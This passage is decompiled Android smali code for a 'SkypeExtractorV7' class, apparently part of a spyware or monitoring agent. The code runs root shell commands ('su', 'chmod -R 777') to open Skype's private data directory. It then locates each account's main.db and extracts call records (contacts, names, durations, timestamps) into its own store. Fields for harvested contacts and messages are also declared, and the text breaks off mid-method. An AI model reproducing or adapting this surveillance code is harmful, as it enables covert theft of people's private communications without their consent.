.class public Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;
.super Ljava/lang/Object;
.source "SkypeExtractorV7.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "SkypeExtractorV7"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "SkypeTmpFile"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected skypeCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected skypeContactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected skypeMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 73
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 58
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    .line 59
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 60
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 62
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    .line 63
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 64
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 74
    iput-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    .line 75
    iput-object p2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    .line 76
    iput-object p3, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 77
    iput-object p4, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 78
    iput-object p5, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 79
    iput-object p6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 5

    .line 661
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 664
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "su"

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 666
    new-instance v3, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 668
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 669
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod -R 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 672
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 675
    :goto_0
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    const-string p2, "exit\n"

    .line 677
    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 678
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    .line 680
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    const-string p2, "SkypeExtractorV7"

    .line 682
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Chroot successful: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, p2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "SkypeExtractorV7"

    const-string v2, "chmod(path): InterruptedException caught during chmod."

    .line 692
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception p1

    const-string p2, "SkypeExtractorV7"

    const-string v2, "chmod(path): IOException caught during chmod."

    .line 687
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 760
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 761
    new-instance v1, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 763
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 764
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 768
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractorV7"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method protected constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 511
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "_"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 640
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 641
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 643
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 644
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 646
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 648
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 649
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectDatabaseFiles()Ljava/util/List;
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 548
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const-string v1, "/data/data/com.skype.raider/files/"

    .line 551
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->isReadable(Ljava/lang/String;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_0

    .line 552
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 556
    :cond_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 557
    new-instance v1, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;

    const-string v4, "live#"

    invoke-direct {v1, v4}, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_3

    .line 559
    array-length v2, v1

    if-lez v2, :cond_3

    .line 560
    array-length v2, v1

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_3

    aget-object v5, v1, v4

    .line 561
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "/main.db"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 563
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p0, v7}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->isReadable(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_1

    .line 564
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    const/4 v7, 0x1

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {p0, v5, v7}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 567
    :cond_1
    new-instance v5, Ljava/io/File;

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 569
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v7

    if-eqz v7, :cond_2

    invoke-virtual {v5}, Ljava/io/File;->isFile()Z

    move-result v5

    if-eqz v5, :cond_2

    .line 570
    invoke-interface {v0, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 582
    :cond_3
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_5

    .line 583
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->extractSkypeUsername()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_5

    .line 586
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "/data/data/com.skype.raider/files/"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/main.db"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 588
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->isReadable(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_4

    .line 589
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 592
    :cond_4
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 594
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v2

    if-eqz v2, :cond_5

    .line 595
    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_5
    return-object v0
.end method

.method protected extractCalls(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 9

    const/4 v0, 0x0

    .line 403
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 404
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 410
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_call_id"

    .line 412
    invoke-virtual {p0, v2, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 410
    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    .line 417
    :try_start_0
    new-instance v2, Lcom/hp/vd/module/custom/skype/CallColumns;

    invoke-direct {v2}, Lcom/hp/vd/module/custom/skype/CallColumns;-><init>()V

    const-string v3, "SELECT cm.id, cm.type, cm.status, cm.call_duration, cm.identity, c.fullname, cm.creation_timestamp FROM CallMembers cm LEFT JOIN contacts c ON c.skypename = cm.identity WHERE cm.id > ? AND cm.type IN (1, 2) ORDER BY cm.id ASC LIMIT ?"

    const/4 v4, 0x2

    .line 420
    new-array v4, v4, [Ljava/lang/String;

    .line 423
    invoke-virtual {v1}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v0, 0x1

    const-string v5, "500"

    aput-object v5, v4, v0

    .line 420
    invoke-virtual {p1, v3, v4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-eqz p1, :cond_7

    .line 428
    invoke-interface {p1}, Landroid/database/Cursor;->getCount()I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v0, :cond_0

    goto/16 :goto_5

    :cond_0
    move-object v0, v1

    .line 434
    :goto_0
    :try_start_1
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 435
    new-instance v3, Lcom/hp/vd/data/SkypeCallData;

    invoke-direct {v3}, Lcom/hp/vd/data/SkypeCallData;-><init>()V

    .line 437
    iput-object p2, v3, Lcom/hp/vd/data/SkypeCallData;->profile:Ljava/lang/String;

    .line 438
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "id"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeCallData;->internalId:Ljava/lang/Integer;

    .line 440
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "call_duration"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeCallData;->duration:Ljava/lang/Integer;

    .line 441
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "type"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    .line 442
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "status"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v3, Lcom/hp/vd/data/SkypeCallData;->status:Ljava/lang/Integer;

    .line 444
    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v3, Lcom/hp/vd/data/SkypeCallData;->type:Ljava/lang/Integer;

    .line 446
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "identity"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 447
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v6, "fullname"

    invoke-interface {p1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {p1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 449
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_OUTGOING:Ljava/lang/Integer;

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    const/4 v8, 0x0

    if-ne v4, v7, :cond_1

    move-object v7, v8

    goto :goto_1

    :cond_1
    move-object v7, v6

    :goto_1
    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->fromDisplayName:Ljava/lang/String;

    .line 450
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_OUTGOING:Ljava/lang/Integer;

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    if-ne v4, v7, :cond_2

    move-object v7, p2

    goto :goto_2

    :cond_2
    move-object v7, v5

    :goto_2
    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->fromSkypeId:Ljava/lang/String;

    .line 451
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_OUTGOING:Ljava/lang/Integer;

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    if-ne v4, v7, :cond_3

    goto :goto_3

    :cond_3
    move-object v6, v8

    :goto_3
    iput-object v6, v3, Lcom/hp/vd/data/SkypeCallData;->toDisplayName:Ljava/lang/String;

    .line 452
    sget-object v6, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_OUTGOING:Ljava/lang/Integer;

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-ne v4, v6, :cond_4

    goto :goto_4

    :cond_4
    move-object v5, p2

    :goto_4
    iput-object v5, v3, Lcom/hp/vd/data/SkypeCallData;->toSkypeId:Ljava/lang/String;

    .line 454
    new-instance v4, Ljava/sql/Date;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "creation_timestamp"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v5

    const-wide/16 v7, 0x3e8

    mul-long/2addr v5, v7

    invoke-direct {v4, v5, v6}, Ljava/sql/Date;-><init>(J)V

    iput-object v4, v3, Lcom/hp/vd/data/SkypeCallData;->createdAt:Ljava/util/Date;

    .line 456
    iget-object v4, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 458
    iget-object v3, v3, Lcom/hp/vd/data/SkypeCallData;->internalId:Ljava/lang/Integer;

    move-object v0, v3

    goto/16 :goto_0

    .line 461
    :cond_5
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v0, v1, :cond_6

    .line 468
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_call_id"

    .line 469
    invoke-virtual {p0, v2, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 468
    invoke-virtual {p1, v2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 473
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 474
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 490
    :cond_6
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV7"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Skype Calls ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v2, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_0
    move-exception p1

    goto :goto_6

    .line 429
    :cond_7
    :goto_5
    :try_start_2
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SkypeExtractorV7"

    const-string v2, "callCursor is NULL or count == 0. Exiting..."

    invoke-interface {p1, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    return-void

    :catch_1
    move-exception p1

    move-object v0, v1

    .line 478
    :goto_6
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SkypeExtractorV7"

    const-string v4, "Error extracting data."

    invoke-interface {v2, v3, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v0, v1, :cond_8

    .line 481
